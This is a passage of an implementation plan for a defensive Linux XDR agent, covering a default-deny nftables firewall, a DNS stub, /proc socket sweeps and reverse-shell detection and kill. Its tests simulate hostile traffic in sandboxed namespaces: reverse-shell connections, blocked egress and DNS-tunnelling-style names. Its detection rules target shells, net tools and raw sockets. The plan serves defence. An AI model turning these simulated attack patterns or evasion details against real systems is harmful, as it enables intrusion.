# XDR Plan 2: Network Enforcement & Reverse-Shell Kill — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `xdr agent` on a target box: a default-deny nftables table that only lets scored-service, SSH and XDR traffic through, DNS off by default behind a local stub with a per-host switch, and a sensor loop that finds reverse shells, blocked egress, direct DNS, raw sockets and unknown listeners, kills the offending process subtree (never a scored service) and writes an incident.

**Architecture:** Two sensing layers feed one pure detector. A **sweep** reads `/proc` (process table, per-netns socket tables) every second; it is the spec's fallback, it sees what existed before the agent started, and it is unit-tested against fixture trees. **Events** (exec, connect, sendmsg, socket) come from embedded CO-RE eBPF programs, or from the netlink proc connector when eBPF cannot load, and trigger an immediate look at one pid. Detectors are pure functions `(snapshot, event, policy) → []Detection`; the responder turns a detection into kill / held / alert and an incident line. The firewall is a small rule IR built from deployment config: a pure evaluator tests the policy, a netlink translator applies it atomically and re-asserts it on drift. Everything deployment-specific (addresses, ports, names) comes from a local JSON config; signed config, fleet and console arrive in Plans 3 and 6.

**Tech Stack:** Go 1.27, `CGO_ENABLED=0`; `github.com/google/nftables` v0.3.0 (netlink, no `nft` binary on targets); `github.com/cilium/ebpf` v0.22.0 with `bpf2go` (objects generated on the dev box with clang, committed, embedded); `github.com/mdlayher/netlink` (proc connector; already pulled in by nftables); `golang.org/x/net/dns/dnsmessage`; `golang.org/x/sys/unix` (pidfd, netlink constants); `ip netns` on the dev box and LXD for the 24.04 VM.

**Spec:** `docs/superpowers/specs/2026-11-10-xdr-design.md` §3a, §4 (eBPF, firewall), §6.1, §7.1 steps 1–2, §7.2, §7.4 listeners, §8 firewall and DNS, §9 (enforcement outlives the agent). Roadmap: `docs/superpowers/plans/2026-11-10-xdr-roadmap.md` row 2.

## Global Constraints

- Linux only, target Ubuntu 24.04 (kernel 6.8). Dev box is Ubuntu 26.04 (kernel 7.0): kernel behaviour is checked on both — root-gated tests on the dev box, the VM for 24.04.
- One static binary: `CGO_ENABLED=0 go build -trimpath`. Nothing is needed on a target: no `nft`, `clang`, `bpftool`, `iproute2`.
- Nothing from the competition packet is compiled in. Addresses, ports, host names, user names and service paths live in the deployment config (`/etc/xdr/agent.json`, root-owned, 0600). Tests and examples use made-up values (`192.0.2.0/24`, `198.51.100.0/24`, `gray1`).
- Response is on-box only: kill, block, log. Never connect to, scan or answer a remote address found in a detection.
- Scored-service guard (§7.2): a process listening on a scored port, or whose executable is in the config's `guard_exes`, is never killed by the agent. Its detections are logged with action `held`. Its children can be killed.
- Gray-team accounts (`gray_users` in config) are never killed for `egress`, `dns`, `rawsock` or `listener` (action `alert`); `revshell-stdio` and `service-shell` are still killed.
- Never kill pid 1, a kernel thread, the agent itself, or an ancestor of the offending process.
- The nftables table is `inet xdr`, base chains `input`, `output`, `forward`, type filter, priority -10, policy drop. The agent never removes it on exit; only `xdr fw remove` does.
- `/proc` content (comm, cmdline, exe paths) is hostile input: bounded reads, no terminal control bytes printed raw (reuse `cli.printable`), one incident is one JSON line.
- Intervals: sweep 1 s; firewall and DNS-file check 3 s; incident dedupe window 60 s.
- Module path `xdr`; new packages go under `internal/`.

## Calls made in this plan (not in the spec — review these)

- **Unknown listener or raw socket held by an unmodified base-image binary is alert-only, not killed.** §7.4 says kill unknown listeners, but there is no listener baseline until the console exists, and killing `systemd-networkd` (DHCP on udp/68) would cost a box its address. The firewall still blocks the port. Holders that are not baseline binaries, or are shells / interpreters / net tools, are killed. `xdr listeners` prints the current listeners as a config snippet so known ones can be silenced.
- **The DNS stub always runs**, also with the switch off. `/etc/resolv.conf` points at it and it answers NXDOMAIN at once, so a scored service that does its own lookups (Postfix) fails fast instead of waiting out a dropped packet, and every name asked is logged with the asking process. With the switch on it forwards only allowed names. Refusal is NXDOMAIN, not REFUSED, so callers do not retry.
- **"Only the agent may send to port 53"** is done with a socket mark (`0x58445201`) on the stub's upstream socket. Root can forge a mark; the destination is still pinned to the team resolver.
- **Outbound ping is dropped** (ICMP tunnels); inbound echo is answered. DHCP client traffic is allowed unless `dhcp` is false.
- **Established is not a free pass.** Only the *reply* direction of a tracked connection is accepted statelessly; the original direction must match an allow rule on every packet. A reverse shell opened before the table loads is cut; an in-flight scored or SSH session survives (measured in a netns trial).
- **`xdr fw try`** applies the table and removes it again unless `xdr fw confirm` is run within the timeout: there is no console to recover from a wrong jump-box address.
- **`kill: false`** in config makes every kill a logged `would-kill`, for a first run against live scored boxes.
- **`accept` and `bind` are not hooked.** §6.1 lists them; listeners and accepted connections are read from the socket tables by the 1 s sweep instead, which also sees the ones that existed before the agent started. Hooked: exec, connect, sendmsg, socket.
- **Host-to-container traffic is egress like any other.** A port published by Docker is reached from outside through the forward chain and needs nothing extra; a host process talking to a container address (`docker-proxy` serving `localhost`, a host client of a containerised database) needs an `allow_out` entry for the bridge subnet. The example config carries one.
- **Socket BPF filters** are covered through their holders (packet/raw sockets); a classic filter on an ordinary TCP/UDP socket is not detected.
- **Not in this plan:** eBPF pinning and tamper response (Plan 5), rule writing and fleet hunt from an incident (Plan 3), approval of `held` detections (Plan 6), a `netdev` egress chain for `AF_PACKET` sends (raw-socket holders are killed instead), DNS over TCP in the stub, DNS for containers.

## Review Focus

1. **A wrong or missing jump-box address in the config** would lock the operator out with no console. A config with no `jump` address is refused; `fw try` reverts by itself. Tests: `TestValidate_RefusesLockout` (Task 1), `try-reverts` case in `test/netns/fw.sh` (Task 3).
2. **Connections that exist when the table loads**: an established reverse shell must stop passing traffic, an in-flight session to a scored port must keep working. Tests: `TestVerdict_EstablishedOriginalDirectionNeedsAllow` (Task 2), `pre-existing` cases in `test/netns/fw.sh` (Task 3).
3. **The process exits, or its pid is reused, between detection and kill**: nothing else may die (the scored service could get that pid). Test: `TestKillTree_PidReused` (Task 9).
4. **eBPF cannot load** (lockdown, missing BTF, verifier): the agent keeps running on the fallback and says which sensor is active. Test: `TestRun_FallsBackWhenEBPFFails` (Task 12), `fallback` case in the VM (Task 13).
5. **Hostile process names and command lines** (newlines, escape sequences, invalid UTF-8, 100 kB cmdline): the incident stays one JSON line and the terminal print is escaped. Tests: `TestLog_HostileFieldsOneLine`, `TestPrint_EscapesControlBytes` (Task 7).

---

## File Structure

```
internal/config/config.go        deployment config: types, Load, Validate
internal/fw/rules.go             rule IR, Build(cfg), Verdict (pure evaluator)
internal/fw/nft.go               IR → netlink: Apply, Drifted, Remove
internal/dnsguard/files.go       hosts block, nsswitch pin, resolv.conf pin
internal/dnsguard/stub.go        local DNS stub, allow list, upstream mark
internal/dnsguard/score.go       name scoring (length, entropy, burst)
internal/proc/proc.go            /proc snapshot: processes, exe hash
internal/proc/sockets.go         per-netns socket tables, fd → socket
internal/proc/lineage.go         parent chain, origin, container
internal/incident/incident.go    Incident type, JSONL log with dedupe, Print
internal/detect/policy.go        Policy from config + baseline
internal/detect/detect.go        Sweep and Event detectors
internal/respond/kill.go         Decide (guard table), KillTree
internal/sensor/sensor.go        Event, Source interface
internal/sensor/procconn.go      netlink proc connector source
internal/sensor/ebpf.go          eBPF loader, ring buffer reader
internal/sensor/bpf/sensor.c     eBPF programs
internal/sensor/sensor_x86_bpfel.{go,o}   generated by bpf2go, committed
internal/agent/agent.go          wiring and loops
internal/cli/agent.go            agent, fw, incidents, listeners subcommands
internal/cli/cli.go              (modify) dispatch the new subcommands
deploy/agent.example.json        example with made-up values
test/netns/fw.sh                 kernel firewall test in throwaway netns (root)
test/vm/e2e-net.sh               24.04 VM: the whole agent against live attacks
test/vm/svc.py                   stand-in scored service for that VM
Makefile                         (modify) bpf, test-root, e2e-net targets
```

Fixture `/proc` trees are built in tests with `internal/testfs` (`File`, `Symlink`; a dangling symlink target such as `socket:[4242]` or `net:[4026531840]` is what the kernel shows).

---
### Task 1: Deployment config

**Files:**
- Create: `internal/config/config.go`, `deploy/agent.example.json`
- Test: `internal/config/config_test.go`

**Interfaces:**
- Produces:

```go
type Net struct{ netip.Prefix }            // UnmarshalText accepts "192.0.2.7" (→ /32 or /128) or CIDR
type Port struct{ Proto string; Port uint16 }              // json: proto ("tcp"|"udp"), port
type Dest struct{ To Net; Proto string; Port uint16 }      // json: to, proto, port
type Listener struct{ Proto string; Port uint16; Exe string }
type DNS struct {
	Resolver netip.Addr            // json: resolver   — the team resolver
	Enabled  bool                  // json: enabled    — the switch
	Expires  time.Time             // json: expires    — zero: no expiry
	Allow    []string              // json: allow      — names the stub may forward (exact, lower case)
	Hosts    map[string]netip.Addr // json: hosts      — written to /etc/hosts
	Listen   string                // json: listen     — default "127.0.0.1:53"
}
type Config struct {
	Host      string     // json: host
	Jump      []Net      // json: jump       — SSH and XDR allowed from here
	Peers     []Net      // json: peers      — the other agents
	SSHFrom   []Net      // json: ssh_from   — further SSH sources (gray/red subnet)
	SSHPort   uint16     // json: ssh_port   — default 22
	XDRPorts  []uint16   // json: xdr_ports  — default [7443]
	Scored    []Port     // json: scored
	AllowOut  []Dest     // json: allow_out  — outbound a scored service needs
	GuardExes []string   // json: guard_exes — absolute paths of scored-service binaries
	Listeners []Listener // json: listeners  — known listeners (silent)
	GrayUsers []string   // json: gray_users
	DHCP      bool       // json: dhcp       — default true
	Kill      bool       // json: kill       — default true
	DNS       DNS        // json: dns
}
func Load(path string) (*Config, error)        // defaults, unknown fields refused, then Validate
func (c *Config) Validate() error
func (c *Config) DNSOn(now time.Time) bool     // Enabled && (Expires.IsZero() || now.Before(Expires))
```

- [ ] **Step 1: Write the failing tests** in `config_test.go`:
  - `TestLoad_Defaults`: a file with only `host` and `jump` gives `SSHPort==22`, `XDRPorts==[7443]`, `DHCP`, `Kill` true, `DNS.Listen=="127.0.0.1:53"`.
  - `TestLoad_UnknownFieldRefused`: `{"jmup":["192.0.2.7"]}` → error containing `jmup`.
  - `TestValidate_RefusesLockout`: no `jump` → error containing `jump`.
  - `TestValidate_Table`: each of these is an error — proto `"sctp"`, port `0`, `guard_exes` entry `apache2` (not absolute), `dns.enabled` with zero resolver, `dns.allow` entry `Bad_Name.`, `dns.hosts` key with a space, `listeners` entry with empty exe.
  - `TestNet_AddrOrCIDR`: `"192.0.2.7"` → `192.0.2.7/32`; `"2001:db8::1"` → `/128`; `"192.0.2.0/24"` kept; `"x"` → error.
  - `TestDNSOn_Expiry`: enabled with `Expires` one minute ago → false; zero expiry → true.
- [ ] **Step 2: Run** `go test ./internal/config` — Expected: FAIL (package does not compile: `Load` undefined).
- [ ] **Step 3: Implement** `config.go`. `Load` reads with `collect.ReadFile(path, 1<<20)`, decodes into a `Config` pre-filled with the defaults using `json.Decoder.DisallowUnknownFields`.
- [ ] **Step 4: Write `deploy/agent.example.json`** using only documentation addresses (`192.0.2.0/24`, `198.51.100.0/24`), `gray_users: ["gray1"]`, one `allow_out` entry for a container bridge subnet (`198.51.100.128/25` tcp/80), and add `TestExampleConfigLoads` (loads the file, expects no error).
- [ ] **Step 5: Run** `go test ./internal/config` — Expected: PASS.
- [ ] **Step 6: Commit** — `git add internal/config deploy && git commit -m "feat: deployment config for the agent"`

### Task 2: Firewall policy (pure)

**Files:**
- Create: `internal/fw/rules.go`
- Test: `internal/fw/rules_test.go`

**Interfaces:**
- Consumes: `config.Config`, `(*Config).DNSOn`.
- Produces:

```go
const DNSMark uint32 = 0x58445201
type Action int   // Accept, Drop
type CT int       // CTAny, CTInvalid, CTReply (direction reply, state established|related), CTRelated
type Rule struct {
	Loopback  bool          // iif lo on input, oif lo on output
	CT        CT
	Proto     uint8         // 0 any, else unix.IPPROTO_*
	Src, Dst  *netip.Prefix // nil any
	SPort, DPort uint16     // 0 any
	ICMPType  int           // -1 any
	OrigDPort uint16        // != 0: ct status dnat and ct original proto-dst
	Mark      uint32        // != 0: meta mark
	Action    Action
}
type Ruleset struct{ Input, Output, Forward []Rule }   // chain policy is always drop
func Build(c *config.Config, now time.Time) Ruleset
func (rs Ruleset) String() string                      // nft-like text, one rule per line

type Packet struct {
	Hook      int           // HookInput, HookOutput, HookForward
	Loopback  bool
	State     int           // StateNew, StateEstablished, StateRelated, StateInvalid
	Reply     bool          // conntrack direction
	Proto     uint8
	Src, Dst  netip.Addr
	SPort, DPort uint16
	ICMPType  int
	DNAT      bool
	OrigDPort uint16
	Mark      uint32
}
func (rs Ruleset) Verdict(p Packet) Action             // first matching rule, else Drop
```

The policy `Build` must produce, in this order (one `Rule` per address × port; no sets, so a listed rule can be compared field by field in Task 3):

```
input    iif lo accept
         ct state invalid drop
         ct direction reply ct state established,related accept
         ct state related, proto icmp | icmpv6 accept
         icmp echo-request accept;  icmpv6 echo-request accept
         icmpv6 nd-neighbor-solicit | nd-neighbor-advert | nd-router-advert accept
         udp sport 67 dport 68 accept                                   [dhcp]
         <each scored>            proto dport P accept                  (any source)
         <each jump ∪ ssh_from>   saddr S tcp dport ssh_port accept
         <each jump ∪ peers> × <each xdr_port>  saddr S tcp dport X accept
output   oif lo accept
         ct state invalid drop
         ct direction reply ct state established,related accept
         ct state related, proto icmp | icmpv6 accept
         icmpv6 nd-neighbor-solicit | nd-neighbor-advert | nd-router-solicit accept
         udp sport 68 dport 67 accept                                   [dhcp]
         <each jump ∪ peers> × <each xdr_port>  daddr D tcp dport X accept
         <each allow_out>         daddr TO proto dport P accept
         meta mark DNSMark daddr RESOLVER udp dport 53 accept           [DNSOn(now)]
forward  ct state invalid drop
         ct direction reply ct state established,related accept
         ct state related, proto icmp accept
         <each scored>            ct status dnat, proto, ct original proto-dst P accept
         <each allow_out>         daddr TO proto dport P accept
```

- [ ] **Step 1: Write the failing tests** in `rules_test.go`. One fixture config: jump `192.0.2.7`, peer `192.0.2.4`, ssh_from `198.51.100.0/24`, scored tcp/80, allow_out `192.0.2.3 tcp/3306`, resolver `192.0.2.1`, DNS off. `stranger` is `203.0.113.9`, `box` is `192.0.2.5`.
  - `TestVerdict_Inbound`: new tcp to :80 from stranger → Accept; to :4444 → Drop; :22 from jump → Accept; :22 from `198.51.100.20` → Accept; :22 from stranger → Drop; :7443 from peer → Accept; :7443 from stranger → Drop; echo-request in → Accept.
  - `TestVerdict_Outbound`: new tcp to stranger:443 → Drop; to peer:7443 → Accept; to `192.0.2.3`:3306 → Accept; to `192.0.2.3`:22 → Drop; echo-request out → Drop; udp 68→67 → Accept, and Drop when `DHCP` is false; loopback → Accept.
  - `TestVerdict_EstablishedOriginalDirectionNeedsAllow`: output, established, `Reply:false`, to stranger:9999 → Drop; input, established, `Reply:false`, dport 4444 → Drop; input, established, `Reply:true`, from peer sport 7443 → Accept; output, established, `Reply:true`, sport 80 → Accept.
  - `TestVerdict_DNS`: udp/53 to resolver, mark set, DNS off → Drop; DNS on → Accept; on but `Expires` in the past → Drop; on, mark `0` → Drop; on, mark set, dst `203.0.113.53` → Drop; tcp/53 and tcp/853 to anywhere → Drop.
  - `TestVerdict_Forward`: `DNAT:true, OrigDPort:80`, new → Accept; `DNAT:true, OrigDPort:8081` → Drop; new from a container address to stranger:443 → Drop; to `192.0.2.3`:3306 → Accept; reply established → Accept.
  - `TestVerdict_IPv6`: `ssh_from` holding `2001:db8::/32` admits ssh from `2001:db8::9`; stranger v6 dropped.
- [ ] **Step 2: Run** `go test ./internal/fw` — Expected: FAIL (`Build` undefined).
- [ ] **Step 3: Implement** `rules.go`.
- [ ] **Step 4: Run** `go test ./internal/fw` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: firewall policy as a rule list with an evaluator"`

### Task 3: Firewall in the kernel, `xdr fw`

**Files:**
- Create: `internal/fw/nft.go`, `internal/cli/agent.go`, `test/netns/fw.sh`
- Modify: `internal/cli/cli.go` (dispatch `fw`), `Makefile` (`test-root`), `go.mod`
- Test: `internal/fw/nft_test.go`, `internal/cli/agent_test.go`

**Interfaces:**
- Consumes: `fw.Ruleset`, `fw.Build`, `config.Load`.
- Produces:

```go
type Firewall struct{ /* lasting nftables.Conn, read-back of the last Apply */ }
func Open() (*Firewall, error)                 // in the calling thread's netns
func (f *Firewall) Apply(rs Ruleset) error     // one transaction: add table, flush it, chains, rules
func (f *Firewall) Drifted() (bool, error)     // table, chains (hook, priority -10, policy drop) and every rule's exprs equal the read-back taken after Apply
func (f *Firewall) Remove() error
func (f *Firewall) Close() error
```
CLI: `xdr fw print|apply|try|confirm|remove --config FILE`; `try` takes `--timeout` (default 60s), waits for `/run/xdr/fw-confirm` (written by `confirm`, removed by `try` on start), and on timeout calls `Remove` and exits 1 printing `reverted`.

- [ ] **Step 1:** `go get github.com/google/nftables@v0.3.0`.
- [ ] **Step 2: Write the failing kernel tests** in `nft_test.go`. Helper `inNetns(t)` skips unless root, then `runtime.LockOSThread()` and `unix.Unshare(unix.CLONE_NEWNET)`.
  - `TestKernel_ApplyIdempotent`: `Apply` twice; `Drifted()` false; the three chains list with policy drop and `len(rules) == len(rs.<Chain>)`.
  - `TestKernel_DriftInsertedRule`: a second conn inserts `accept` at the top of `output` → `Drifted()` true; `Apply` → false.
  - `TestKernel_DriftSameCountDifferentRule`: delete the last `output` rule and add `accept` → `Drifted()` true.
  - `TestKernel_DriftTableDeleted`: `DelTable` → `Drifted()` true, `Apply` restores.
  - `TestKernel_Remove`: after `Remove`, `ListTableOfFamily("xdr", inet)` finds nothing; a second `Remove` is not an error.
- [ ] **Step 3: Run** `sudo -E "$(command -v go)" test -run Kernel ./internal/fw` — Expected: FAIL (`Open` undefined).
- [ ] **Step 4: Implement** `nft.go`. To learn the expression list for a statement, load it as text in a throwaway netns and read `nft --debug=netlink list ruleset`. `ct direction` is a 1-byte compare with `1`; `ct status dnat` is a bitwise test of `0x20`; `ct original proto-dst` is `expr.Ct{Key: CtKeyPROTODST, Direction: 0}`.
- [ ] **Step 5: Run** the Step 3 command — Expected: PASS (5 tests, none skipped).
- [ ] **Step 6: Write `test/netns/fw.sh`** (root; uses `ip`, `nft`, `python3` from the dev box). Namespaces: `xa` is the box (`192.0.2.5`), `xb` holds the jump (`192.0.2.7`) and a stranger (`203.0.113.9`) address, `xc` sits behind `xa` as a container with a DNAT `xa:8080 → xc:80` in a separate `ip nat` table. Config: scored tcp/80 and tcp/8080. It runs `ip netns exec xa bin/xdr fw …` and prints `ok <case>` or `FAIL <case>`, exiting non-zero on any failure:

| case | action | expected |
|---|---|---|
| `scored-in` | stranger → xa:80 | connects, data both ways |
| `unknown-in` | stranger → xa:4444 | times out |
| `ssh-jump` / `ssh-stranger` | → xa:22 | connects / times out |
| `egress-denied` | xa → stranger:9999 | times out |
| `egress-xdr` | xa → jump:7443 | connects |
| `ping-in` / `ping-out` | | answered / lost |
| `pre-existing-revshell` | xa → stranger:9999 opened, then `fw apply` | no further data in either direction |
| `pre-existing-scored` | stranger → xa:80 opened, then `fw apply` | keeps exchanging data |
| `forward-published` | stranger → xa:8080 | connects to xc |
| `forward-egress` | xc → stranger:9999 | times out |
| `try-reverts` | `fw try --timeout 3s`, no confirm | exit 1, table gone |
| `try-confirmed` | `fw try --timeout 10s`, `fw confirm` after 1s | exit 0, table present |

- [ ] **Step 7: Write the failing CLI tests** in `agent_test.go`: `TestFwPrint` (`fw print --config` of the example config prints a line containing `tcp dport 22 accept` and exits 0, without root); `TestFw_BadConfigExits2` (missing `jump` → exit 2, stderr names `jump`, nothing applied).
- [ ] **Step 8: Run** `go test ./internal/cli -run Fw` — Expected: FAIL (unknown command `fw`).
- [ ] **Step 9: Implement** the `fw` subcommand in `internal/cli/agent.go`; add to the Makefile:

```make
test-root: build
	sudo -E "$$(command -v go)" test -count=1 -run Kernel ./internal/...
	sudo test/netns/fw.sh
```

- [ ] **Step 10: Run** `go test ./... && make test-root` — Expected: PASS, and 14 `ok` lines with no `FAIL` from `fw.sh`.
- [ ] **Step 11: Commit** — `git commit -m "feat: apply, check and try the firewall table over netlink"`

### Task 4: DNS files pinned

**Files:**
- Create: `internal/dnsguard/files.go`
- Test: `internal/dnsguard/files_test.go`

**Interfaces:**
- Consumes: `config.Config`, `DNSOn`, `collect.ReadFile`.
- Produces: `func Assert(root string, c *config.Config, now time.Time) (changed []string, err error)` — brings three files under `root` to the wanted content and returns the paths it had to rewrite (empty when nothing drifted). Writes are temp file + rename in the same directory, mode 0644.

Wanted content:
- `/etc/hosts` (whole file is ours): `127.0.0.1 localhost`, `127.0.1.1 <host>`, `::1 localhost ip6-localhost ip6-loopback`, then `ADDR NAME` for each `dns.hosts` entry sorted by name.
- `/etc/nsswitch.conf`: the `hosts:` line becomes `hosts:          files` (switch off) or `hosts:          files dns` (on); every other line kept; appended if absent.
- `/etc/resolv.conf`: a regular file `nameserver <address of dns.listen>` + `options timeout:1 attempts:1`. A symlink there (Ubuntu's link into `/run/systemd/resolve`) is replaced, not followed.

- [ ] **Step 1: Write the failing tests** (fixture root from `testfs`): `TestAssert_HostsExact` (byte-exact file for two entries); `TestAssert_NsswitchOffThenOn` (other lines untouched); `TestAssert_ResolvConfSymlinkReplaced` (the link becomes a regular file; the file it pointed at is unchanged); `TestAssert_SecondRunChangesNothing` (`changed` empty, mtimes equal); `TestAssert_DriftRepaired` (append `203.0.113.9 scoring` to hosts → `changed == ["/etc/hosts"]`, content restored); `TestAssert_FifoInPlace` (a FIFO at `/etc/hosts` is replaced without blocking).
- [ ] **Step 2: Run** `go test ./internal/dnsguard` — Expected: FAIL (`Assert` undefined).
- [ ] **Step 3: Implement** `files.go`.
- [ ] **Step 4: Run** `go test ./internal/dnsguard` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: pin hosts, nsswitch and resolv.conf"`

### Task 5: DNS stub and name scoring

**Files:**
- Create: `internal/dnsguard/stub.go`, `internal/dnsguard/score.go`
- Test: `internal/dnsguard/stub_test.go`, `internal/dnsguard/score_test.go`

**Interfaces:**
- Consumes: `fw.DNSMark`.
- Produces:

```go
type Query struct {
	Name    string          // lower case, no trailing dot
	Type    uint16
	Client  netip.AddrPort  // loopback source; the agent maps the port to a process
	Allowed bool
}
type Stub struct {
	Allowed  func(name string) bool                              // exact name match; the agent returns false for all when the switch is off
	Upstream func(ctx context.Context, q []byte) ([]byte, error) // one UDP exchange with the resolver
	OnQuery  func(Query)                                         // every well-formed query
}
func (s *Stub) Serve(ctx context.Context, pc net.PacketConn) error
func MarkedUpstream(resolver netip.Addr) func(context.Context, []byte) ([]byte, error) // SO_MARK = fw.DNSMark, port 53, 2 s timeout
func Score(name string, recent int) (points int, reasons []string)                    // recent: queries by the same process in the last 10 s
```

Stub rules: parse with `dnsmessage`. Not a query, opcode ≠ 0, question count ≠ 1, or unparseable → no reply, `OnQuery` not called. `OnQuery` is called before any reply is sent, so the asker's socket still exists when the agent looks it up. Not allowed → reply NXDOMAIN (same ID, question echoed, RD copied, RA set). Allowed → forward the packet unchanged; relay the answer only if its ID and question match; any upstream error or mismatch → SERVFAIL.

Score: `long-label` +2 (a label over 40 bytes); `long-name` +2 (name over 100 bytes); `entropy` +3 (a label of 16+ bytes with Shannon entropy above 3.8 bits/byte); `deep` +1 (more than 5 labels); `burst` +3 (`recent` > 20).

- [ ] **Step 1: Write the failing tests.** Stub tests serve on `net.ListenPacket("udp", "127.0.0.1:0")` with a fake `Upstream`:
  - `TestStub_BlockedIsNXDOMAIN`: query `evil.example` → RCode 3, same ID; `OnQuery` saw `{Name:"evil.example", Allowed:false}`; upstream not called.
  - `TestStub_AllowedForwarded`: answer bytes from the fake reach the client unchanged.
  - `TestStub_OnQueryBeforeReply`: while `OnQuery` blocks on a channel the client has no reply; it arrives once the channel is closed.
  - `TestStub_CaseAndTrailingDot`: `WWW.Example.COM.` is offered to `Allowed` as `www.example.com`.
  - `TestStub_MalformedIgnored`: 12 random bytes, a response packet, a two-question packet → no reply within 200 ms, no panic, `OnQuery` not called; a good query afterwards is still answered.
  - `TestStub_UpstreamFailureIsSERVFAIL`: upstream error → RCode 2; an upstream answer for a different question → RCode 2.
  - `TestScore`: `www.example.com`,0 → 0; `kubernetes-dashboard.example.com`,0 → 0; `mfzwizlomnxw2idbonsg633omruw4zy.t.example.com`,0 → reasons contain `entropy`; a 45-byte label → `long-label`; `a.b.c.d.e.example.com` → `deep`; `www.example.com`,21 → `burst`.
  - `TestKernel_MarkedUpstreamSetsMark` (root): the socket `MarkedUpstream` dials reports `SO_MARK == fw.DNSMark`.
- [ ] **Step 2: Run** `go test ./internal/dnsguard` — Expected: FAIL (`Stub` undefined).
- [ ] **Step 3: Implement** `stub.go`, `score.go` (`go get golang.org/x/net`).
- [ ] **Step 4: Run** `go test ./internal/dnsguard && sudo -E "$(command -v go)" test -run Kernel ./internal/dnsguard` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: local DNS stub with allow list and name scoring"`

### Task 6: `/proc` snapshot

**Files:**
- Create: `internal/proc/proc.go`, `internal/proc/sockets.go`, `internal/proc/lineage.go`
- Test: `internal/proc/proc_test.go`, `internal/proc/sockets_test.go`, `internal/proc/lineage_test.go`

**Interfaces:**
- Produces:

```go
type Proc struct {
	PID, PPID  int
	UID        uint32
	Start      uint64         // starttime from stat: with PID, the identity of a process
	Comm, Exe  string         // Exe is the link text without " (deleted)"
	ExeDeleted bool
	Cmdline    []string       // at most 4096 bytes in total
	Cgroup     string         // the v2 path, e.g. "/system.slice/apache2.service"
	NetNS      string         // link text of ns/net
	FDs        map[int]uint64 // fd → socket inode, sockets only
	Kernel     bool           // no exe and ppid 0 or 2
}
type Sock struct {
	Inode  uint64
	Family int            // unix.AF_INET, AF_INET6, AF_PACKET, AF_UNIX
	Proto  string         // "tcp", "udp", "raw", "packet", "unix"
	Local, Remote netip.AddrPort // v4-mapped v6 addresses are unmapped
	Listen bool           // tcp LISTEN; udp/raw bound with no remote
	SynSent bool
}
type FDSock struct{ FD int; Sock }
type Snapshot struct {
	Procs map[int]*Proc
	Socks map[string]map[uint64]Sock // netns → inode → socket
}
func Read(root string) (*Snapshot, error)             // root: the proc mount
func ReadOne(root string, pid int) (*Proc, error)
func (s *Snapshot) Sockets(p *Proc) []FDSock          // only inodes found in p's netns table
func (s *Snapshot) Descendants(pid int) []int         // children first, then theirs
func (s *Snapshot) Chain(pid int) []*Proc             // self first, up to pid 1; stops on a cycle or a missing parent; at most 64
func (s *Snapshot) UDPOwner(netns string, port uint16) *Proc
func Container(cgroup string) string                  // first 12 hex of a 64-hex docker/containerd id in the path, else ""
func Origin(chain []*Proc) string                     // see below
func ExeHash(root string, p *Proc) (string, error)    // sha256 of <root>/<pid>/exe, first 256 MiB; cached on (dev, inode, size, mtime)
```

Sources: `<pid>/stat` (comm is everything between the first `(` and the last `)`), `status` (`Uid:` real uid), `cmdline`, `exe`, `cgroup` (the `0::` line), `ns/net`, `fd/*` (`socket:[N]`), and once per distinct netns `<pid>/net/{tcp,tcp6,udp,udp6,raw,raw6,packet,unix}`. Every read is bounded (`collect.ReadFile`, 1 MiB) and a pid that vanishes mid-read is skipped.

`Origin`, first match: `container:<id>` if the process cgroup names a container; `ssh` if an ancestor's comm is `sshd`; `cron` if an ancestor's comm is `cron` or `atd`; `unit:<name>` for the last path element of the cgroup ending in `.service` or `.scope`; else `unknown`.

- [ ] **Step 1: Write the failing tests** on fixture trees:
  - `TestRead_Process`: stat line with comm `a) (b`; ppid, start, uid, NUL-split cmdline, exe; exe `/tmp/x (deleted)` → `Exe=="/tmp/x"`, `ExeDeleted`.
  - `TestRead_SocketTables`: tcp line `0100007F:1F90 00000000:0000 0A` → listen `127.0.0.1:8080`; state `02` → `SynSent`; a tcp6 line for `::ffff:203.0.113.9` → `Remote.Addr()==203.0.113.9`; a `packet` line → `Family==AF_PACKET`; a `raw` line → `Proto=="raw"`.
  - `TestSockets_FdToSocket`: `fd/0 → socket:[4242]` resolves to the tcp socket with remote `203.0.113.9:4444`; `fd/3 → socket:[9]` not in any table is left out.
  - `TestRead_TwoNetns`: the same inode number in two netns tables resolves per process netns.
  - `TestChain_CycleAndMissingParent`: ppid cycle `10→11→10` ends after two; missing parent ends the chain.
  - `TestRead_HostileProc`: 1 MiB cmdline → kept bytes ≤ 4096; a pid directory without `stat` is skipped, no error; comm containing `\n` is kept verbatim.
  - `TestOrigin`: the five cases above; `TestContainer`: `/system.slice/docker-<64hex>.scope` and `/docker/<64hex>` → 12 hex; `/system.slice/ssh.service` → `""`.
  - `TestExeHash_FollowsExeAndTracksChange`: hash equals sha256 of the linked file; rewriting the file with new content and mtime changes the hash.
- [ ] **Step 2: Run** `go test ./internal/proc` — Expected: FAIL (`Read` undefined).
- [ ] **Step 3: Implement** the three files.
- [ ] **Step 4: Run** `go test ./internal/proc` — Expected: PASS. Then `go run ./cmd/xdr version >/dev/null` to confirm the tree still builds.
- [ ] **Step 5: Add `TestRead_LiveProc`**: `Read("/proc")` contains `os.Getpid()` with `Exe == os.Executable()`, and a TCP listener the test opens on `127.0.0.1:0` appears in `Sockets` of that process with `Listen` true. Run — Expected: PASS (if it passes at once, break the `fd` scan to see it fail, then restore).
- [ ] **Step 6: Commit** — `git commit -m "feat: process and socket snapshot from /proc"`

### Task 7: Incident log

**Files:**
- Create: `internal/incident/incident.go`
- Modify: `internal/cli/agent.go`, `internal/cli/cli.go` (subcommand `incidents`)
- Test: `internal/incident/incident_test.go`, `internal/cli/agent_test.go`

**Interfaces:**
- Consumes: `model.Severity`, `cli.printable`.
- Produces:

```go
type Endpoint struct{ Addr string; Port uint16; Proto string }
type ProcRef struct{ PID int; Comm, Exe string }
type Incident struct {
	Time     time.Time
	Host, Kind, Action string       // Action: killed | held | alert | would-kill | kill-failed | repaired
	Severity model.Severity
	PID      int
	UID      uint32
	User, Comm, Exe, SHA256 string
	Cmdline  []string
	Cgroup, Container, Origin string
	Chain    []ProcRef
	Remote   *Endpoint
	Detail   string
